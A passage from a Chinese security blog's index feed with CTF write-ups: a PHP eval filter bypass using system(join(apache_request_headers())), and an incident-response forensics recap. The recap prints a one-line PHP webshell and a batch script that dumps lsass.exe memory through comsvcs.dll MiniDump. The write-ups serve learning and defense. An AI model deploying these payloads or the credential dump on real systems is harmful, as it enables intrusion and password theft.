title="ezpython"></a>ezpython</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Hint：fuzz部分需要爆破http://x.x.x.x/的路径，六位数</span><br></pre></td></tr></table></figure><p>进来是一个空白页面 查看源代码 访问下一级目录</p><p><img src="/../images/image-20250824141424090.png" alt="image-20250824141424090"></p><p>进来提示爆破数字组的目录 使用burp爆破一手 六位数 </p><p><img src="/../images/image-20250824141505057.png" alt="image-20250824141505057"></p><p><img src="/../images/image-20250824142613374.png" alt="image-20250824142613374"></p><p><img src="/../images/image-20250824142657740.png" alt="image-20250824142657740"></p><p>跟burp一样爆破参数名 当访问name?&#x3D;1的时候 发现页面更改了 flask+python 打一套ssti</p><p><img src="/../images/image-20250824142949912.png" alt="image-20250824142949912"></p><p><img src="/../images/image-20250824144022280.png" alt="image-20250824144022280"></p><h4 id="ezbypass"><a href="#ezbypass" class="headerlink" title="ezbypass"></a>ezbypass</h4><p>这是一题绕过滤rce题</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$test</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;test&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\（|\）|\-|\=|\+|\&#123;|\[|\]|\&#125;|\:|\&#x27;|\&quot;|\,|\&lt;|\.|\&gt;|\/|\?|\\\\|implode|phpinfo|localeconv|pos|current|print|var|dump|getallheaders|get|defined|str|split|spl|autoload|extensions|eval|phpversion|floor|sqrt|tan|cosh|sinh|ceil|chr|dir|getcwd|getallheaders|end|next|prev|reset|each|pos|current|array|reverse|pop|rand|flip|flip|rand|content|session_id|session_start|echo|readfile|highlight|show|source|file|assert/i&quot;</span>, <span class="variable">$test</span>))&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$test</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;oh nonono hacker!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>); </span><br></pre></td></tr></table></figure><p>过滤了很多运行的命令字符 但是没有过滤system 可以用system来执行命令 发现被禁了getallheaders 但是有别名apache_request_headers()的字符可以使用 end可以使用join使用</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">getallheaders()</span><br><span class="line">getallheaders()返回当前请求的所有请求头信息，局限于Apache（apache_request_headers()和getallheaders()功能相似，可互相替代，不过也是局限于Apache）</span><br><span class="line">当确定能够返回时，我们就能在数据包最后一行加上一个请求头，写入恶意代码，再用end()函数指向最后一个请求头，使其执行，payload：</span><br><span class="line">var_dump(end(getallheaders()));</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20250824153315095.png" alt="image-20250824153315095"></p><p><img src="/../images/image-20250824153733382.png" alt="image-20250824153733382"></p><p>system(join(apache_request_headers()))；</p><p><img src="/../images/image-20250824154125855.png" alt="image-20250824154125855"></p><h4 id=""><a href="#" class="headerlink" title=""></a></h4>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2025年Solar应急响应公益月赛7月--复盘</title>
      <link href="/posts/3233.html"/>
      <url>/posts/3233.html</url>
      
        <content type="html"><![CDATA[<p><img src="/../images/1.png"></p><p>这一次比六月题量多了，取证和应急1没连贯上，用了很多时间后面没做，还得继续沉淀</p><p>学习一下n0o0b神的wp，复盘一手：<a href="https://www.n0o0b.com/archives/solar-7">2025年Solar应急响应公益月赛-7月|n0o0b’s blog</a>。官方解可以去solar公众号食取</p><p>做取证的的时候，还是用 volatility2在乱找,相对来说lovelymem真是好用，Tokeii0神:<a href="https://github.com/Tokeii0/LovelyMem">https://github.com/Tokeii0/LovelyMem</a></p><p>总结：要很多新的知识点，很nice，自己做的时候和复盘排查思路不一样，还是得多总结多学习</p><h2 id="题目信息—–VOL-EASY"><a href="#题目信息—–VOL-EASY" class="headerlink" title="题目信息—–VOL_EASY"></a>题目信息—–VOL_EASY</h2><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">某企业服务器近日遭受隐秘入侵。安全团队通过日志溯源发现，黑客利用Web应用漏洞植入恶意后门，根据溯源的信息配合警方逮捕了黑客，安全团队已经紧急保存了黑客电脑的内存转储文件，请你开始取证以便固定证据。请根据题目文件，找出下面10条证据让罪犯服软吧！</span><br></pre></td></tr></table></figure><h3 id="【任务1】VOL-EASY"><a href="#【任务1】VOL-EASY" class="headerlink" title="【任务1】VOL_EASY"></a>【任务1】VOL_EASY</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">题目信息：</span><br><span class="line">黑客上传的一句话木马密码是多少？</span><br></pre></td></tr></table></figure><p>lovelymem导入镜像，timeline_ntfs发现ezshell.php，右键打开</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">知识点：NTFS日志会记录NTFS文件系统中文件的创建、修改、增加数据、删除等操作执行的时间</span><br></pre></td></tr></table></figure><p><img src="/../images/2.png" alt="2"></p><p><img src="/../images/image-20250729203044299.png" alt="image-20250729203044299"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;solar&#x27;</span>]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>flag{solar}</p><h3 id="【任务2】VOL-EASY"><a href="#【任务2】VOL-EASY" class="headerlink" title="【任务2】VOL_EASY"></a>【任务2】VOL_EASY</h3><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">黑客使用的木马连接工具叫什么（比如xx.exe）？(仅首字母大写)</span><br></pre></td></tr></table></figure><p>看下findevil，发现蚁剑</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">findevil通常指的是通过技术手段检测、定位内存中存在的恶意代码、恶意进程或其他威胁因素的行为或工具功能</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20250729203833881.png" alt="image-20250729203833881"></p><p>flag{Antsword.exe}</p><h3 id="【任务3】VOL-EASY"><a href="#【任务3】VOL-EASY" class="headerlink" title="【任务3】VOL_EASY"></a>【任务3】VOL_EASY</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">黑客使用的木马连接工具的位置在哪里（比如C:\xxxx\xx.exe） ？</span><br></pre></td></tr></table></figure><p>flie直接搜Antsword.exe</p><p><img src="/../images/image-20250729204249198.png" alt="image-20250729204249198"></p><p>flag{C:\Tools\AntSword-Loader-v4.0.3-win32-x64\AntSword.exe}</p><h3 id="【任务4】VOL-EASY"><a href="#【任务4】VOL-EASY" class="headerlink" title="【任务4】VOL_EASY"></a>【任务4】VOL_EASY</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">黑客获取到的FLAG是什么？</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20250729204619083.png" alt="image-20250729204619083"></p><p>flag{ok!get_webshell_is_good_idea~}</p><h3 id="【任务5】VOL-EASY"><a href="#【任务5】VOL-EASY" class="headerlink" title="【任务5】VOL_EASY"></a>【任务5】VOL_EASY</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">黑客入侵的网站地址是多少（只需要http://xxxxx/）？</span><br></pre></td></tr></table></figure><p>我这里是想着蚁剑要连，可能是文件上传到目标网站上，所以在浏览器记录上找到的</p><p><img src="/../images/image-20250729210250666.png" alt="image-20250729210250666"></p><p>n0o0b神这里是先扫描了一手网络，然后试了192.228.79.201，不行就直接正则了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">正则表达式 `\d+\.\d+\.\d+\.\d+` ，这个正则表达式用于匹配IPv4 地址</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20250729205747167.png" alt="image-20250729205747167"></p><p><img src="/../images/image-20250729210758496.png" alt="image-20250729210758496"></p><p>flag{<a href="http://192.168.186.140/%7D">http://192.168.186.140/}</a></p><h3 id="【任务6】VOL-EASY"><a href="#【任务6】VOL-EASY" class="headerlink" title="【任务6】VOL_EASY"></a>【任务6】VOL_EASY</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">黑客入侵时，使用的系统用户名是什么？</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20250729211338146.png" alt="image-20250729211338146"></p><p>flag{Administrator}</p><h3 id="【任务7】VOL-EASY"><a href="#【任务7】VOL-EASY" class="headerlink" title="【任务7】VOL_EASY"></a>【任务7】VOL_EASY</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">黑客创建隐藏账户的密码是多少？</span><br></pre></td></tr></table></figure><p>打的时候，从这题开始就没有连贯起来，想着是被攻击机器的信息，不懂了gg</p><p>n0o0b神直接就正则搜net user，然后猜个5</p><p><img src="/../images/image-20250729211844240.png" alt="image-20250729211844240"></p><p>flag{solar2025}</p><h3 id="【任务8-9-10】VOL-EASY"><a href="#【任务8-9-10】VOL-EASY" class="headerlink" title="【任务8,9,10】VOL_EASY"></a>【任务8,9,10】VOL_EASY</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">黑客首次操作靶机的关键程序是什么？</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20250729212439796.png" alt="image-20250729212439796"></p><p>一开始找ezshell.php，有两个bat文件</p><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line"><span class="built_in">echo</span> [*] 正在获取 lsass.exe PID...</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> /f &quot;tokens=<span class="number">2</span> delims=,&quot; <span class="variable">%%a</span> <span class="keyword">in</span> (&#x27;tasklist /FI &quot;IMAGENAME eq lsass.exe&quot; /FO CSV /NH&#x27;) <span class="keyword">do</span> (</span><br><span class="line">    <span class="built_in">set</span> PID=<span class="variable">%%~</span>a</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> &quot;<span class="variable">%PID%</span>&quot;==&quot;&quot; (</span><br><span class="line">    <span class="built_in">echo</span> [!] 未找到 lsass.exe 进程，或没有权限。</span><br><span class="line">    <span class="built_in">pause</span></span><br><span class="line">    <span class="keyword">exit</span> /b <span class="number">1</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> [*] PID: <span class="variable">%PID%</span></span><br><span class="line"><span class="built_in">echo</span> [*] 正在尝试导出内存转储...</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> OUTPUT=%~dp0lsass.dmp</span><br><span class="line"></span><br><span class="line">rundll32.exe comsvcs.dll, MiniDump <span class="variable">%PID%</span> <span class="variable">%OUTPUT%</span> full</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">exist</span> &quot;<span class="variable">%OUTPUT%</span>&quot; (</span><br><span class="line">    <span class="built_in">echo</span> [✓] 成功导出 lsass 内存为: <span class="variable">%OUTPUT%</span></span><br><span class="line">) <span class="keyword">else</span> (</span><br><span class="line">    <span class="built_in">echo</span> [!] 导出失败，可能权限不足。</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="built_in">pause</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">主要功能是导出系统中lsass.exe进程的内存转储文件（lsass.dmp）,lsass.exe是 Windows 系统的本地安全认证子系统进程，负责处理用户登录认证、密码哈希存储等敏感安全信息</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20250729213256953.png" alt="image-20250729213256953"></p><p>根据程序搜镜像的PID就好了，可以找到pid，文件路劲，直接一波后面三题了</p><h2 id="题目信息—–应急大师"><a href="#题目信息—–应急大师" class="headerlink" title="题目信息—–应急大师"></a>题目信息—–应急大师</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这是一台被黑客入侵的服务器，安全团队有进行一些基础溯源。目前服务器已经断网处理，请你继续协助安全团队进行溯源分析，将整个证据链补充完整。</span><br></pre></td></tr></table></figure><p>这也是取证的时候，被入侵的服务器</p><h3 id="【任务1】应急大师"><a href="#【任务1】应急大师" class="headerlink" title="【任务1】应急大师"></a>【任务1】应急大师</h3><p>做的时候，多是直接敲的cmd命令,这么看来还是直接搜事件的id更快一点</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">请提交隐藏用户的名称？</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20250729214351239.png" alt="image-20250729214351239"></p><p>好像刚进来就给答案了</p><h3 id="【任务2】应急大师"><a href="#【任务2】应急大师" class="headerlink" title="【任务2】应急大师"></a>【任务2】应急大师</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">请提交黑客的IP地址？</span><br></pre></td></tr></table></figure><p>可以由取证哪里知道ip，也可以看phpstudy，nginx日志</p><p>C:&#x2F;phpstudy&#x2F;log&#x2F;nginx_log</p><p><img src="/../images/image-20250729215152539.png" alt="image-20250729215152539"></p><h3 id="【任务3】应急大师"><a href="#【任务3】应急大师" class="headerlink" title="【任务3】应急大师"></a>【任务3】应急大师</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">请提交黑客的一句话木马密码？</span><br></pre></td></tr></table></figure><p>可以由取证哪里知道密码，也可以看phpstudy下的文件</p><p>C:&#x2F;phpstudy&#x2F;WWW&#x2F;uploads&#x2F;</p><p><img src="/../images/image-20250729215449413.png" alt="image-20250729215449413"></p><h3 id="【任务4】应急大师"><a href="#【任务4】应急大师" class="headerlink" title="【任务4】应急大师"></a>【任务4】应急大师</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">请提交黑客创建隐藏用户的TargetSid（目标账户安全ID）？</span><br></pre></td></tr></table></figure><p>wmic useraccount get name,sid</p><p><img src="/../images/image-20250729215809343.png" alt="image-20250729215809343"></p><h3 id="【任务5】应急大师"><a href="#【任务5】应急大师" class="headerlink" title="【任务5】应急大师"></a>【任务5】应急大师</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">请提交黑客创建隐藏账户的事件（格式为 年/月/日 时:分:秒）？</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20250729220827054.png" alt="image-20250729220827054"></p><p>事件查看器搜创建新账户事件，ID为4720</p><h3 id="【任务6】应急大师"><a href="#【任务6】应急大师" class="headerlink" title="【任务6】应急大师"></a>【任务6】应急大师</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">黑客将这个隐藏用户先后加入了哪几个用户组？提交格式为 第一个用户组-第二个用户组，如student-teacher</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">事件 ID 4728：用户被添加到一个全局安全组</span><br><span class="line">事件 ID 4732：用户被添加到一个本地安全组</span><br><span class="line">事件 ID 4756：用户被添加到一个通用安全组</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20250729221500496.png" alt="image-20250729221500496"></p><p><img src="/../images/image-20250729221517184.png" alt="image-20250729221517184"></p><p>先后被添加到Users、Administrators组</p><h3 id="【任务7】应急大师"><a href="#【任务7】应急大师" class="headerlink" title="【任务7】应急大师"></a>【任务7】应急大师</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">黑客通过远程桌面成功登陆系统管理员账号的网络地址及端口号？提交格式为 IP:PORT 如 127.0.0.1:41110</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20250729221843353.png" alt="image-20250729221843353"></p><h2 id="题目信息—–公交车系统攻击事件排查"><a href="#题目信息—–公交车系统攻击事件排查" class="headerlink" title="题目信息—–公交车系统攻击事件排查"></a>题目信息—–公交车系统攻击事件排查</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">思而听公交系统被黑客攻击，黑客通过web进行了攻击并获取了数据，然后获取了其中一位驾校师傅在FTP服务中的私密文件，其后黑客找到了任意文件上传漏洞进行了GETshell，控制了主机权限并植入了挖矿网页挖矿病毒，接下来你需要逐步排查。</span><br></pre></td></tr></table></figure><h3 id="【任务1】公交车系统攻击事件排查"><a href="#【任务1】公交车系统攻击事件排查" class="headerlink" title="【任务1】公交车系统攻击事件排查"></a>【任务1】公交车系统攻击事件排查</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">分析环境内的中间件日志，找到第一个漏洞(黑客获取数据的漏洞)，然后通过分析日志、流量，通过脚本解出黑客获取的用户密码数据，提交获取的前两个用户名，提交格式：flag&#123;zhangsan-wangli&#125;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20250729222756742.png" alt="image-20250729222756742"></p><p>进来就是一个流量包，发现是sql注入</p><p><img src="/../images/image-20250729225021003.png" alt="image-20250729225021003"></p><p>连数据库查，按password排序</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mysql</span><br><span class="line">show databases;</span><br><span class="line">use bus_system</span><br><span class="line">select * from bus_drivers order by password;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20250729225151998.png" alt="image-20250729225151998"></p><p>flag{sunyue-chenhao}</p><h3 id="【任务2】公交车系统攻击事件排查"><a href="#【任务2】公交车系统攻击事件排查" class="headerlink" title="【任务2】公交车系统攻击事件排查"></a>【任务2】公交车系统攻击事件排查</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">黑客通过获取的用户名密码，利用密码复用技术，爆破了FTP服务，分析流量以后找到开放的FTP端口，并找到黑客登录成功后获取的私密文件，提交其文件中内容，提交格式：flag&#123;xxx&#125;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20250729230321641.png" alt="image-20250729230321641"></p><p>直接find搜索ftp，就出了</p><h3 id="【任务3】公交车系统攻击事件排查"><a href="#【任务3】公交车系统攻击事件排查" class="headerlink" title="【任务3】公交车系统攻击事件排查"></a>【任务3】公交车系统攻击事件排查</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">可恶的黑客找到了任意文件上传点，你需要分析日志和流量以及web开放的程序找到黑客上传的文件，提交木马使用的密码，提交格式：flag&#123;password&#125;</span><br></pre></td></tr></table></figure><p>因为是文件上传，直接去找upload就好了</p><p><img src="/../images/image-20250729230656019.png" alt="image-20250729230656019"></p><h3 id="【任务4】公交车系统攻击事件排查"><a href="#【任务4】公交车系统攻击事件排查" class="headerlink" title="【任务4】公交车系统攻击事件排查"></a>【任务4】公交车系统攻击事件排查</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">分析流量，黑客植入了一个web挖矿木马，这个木马现实情况下会在用户访问后消耗用户的资源进行挖矿(本环境已做无害化处理)，提交黑客上传这个文件时的初始名称，提交格式：flag&#123;xxx.xxx&#125;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20250729232809143.png" alt="image-20250729232809143"></p><p>直接解密webshell就ok了</p><p><img src="/../images/image-20250729234332101.png" alt="image-20250729234332101"></p><p>map.php</p><h3 id="【任务5】公交车系统攻击事件排查"><a href="#【任务5】公交车系统攻击事件排查" class="headerlink" title="【任务5】公交车系统攻击事件排查"></a>【任务5】公交车系统攻击事件排查</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">分析流量并上机排查，黑客植入的网页挖矿木马所使用的矿池地址是什么，提交矿池地址(排查完毕后可以尝试删除它)提交格式：flag&#123;xxxxxxx.xxxx.xxx:xxxx&#125;</span><br></pre></td></tr></table></figure><p>map.php变成了index.php，去检测一下index.php</p><p><img src="/../images/image-20250729234906085.png" alt="image-20250729234906085"></p><p>混淆js，解密就能获得</p><p>不会很懂加解密，给ai玩一会去</p>]]></content>
      
      
      <categories>
          
          <category> solar应急响应系列 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 应急响应 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
    
    
    <entry>
      <title>categories</title>
      <link href="/categories/index.html"/>
      <url>/categories/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>tags</title>
      <link href="/tags/index.html"/>
      <url>/tags/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>link</title>
      <link href="/link/index.html"/>
      <url>/link/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
  
</search>
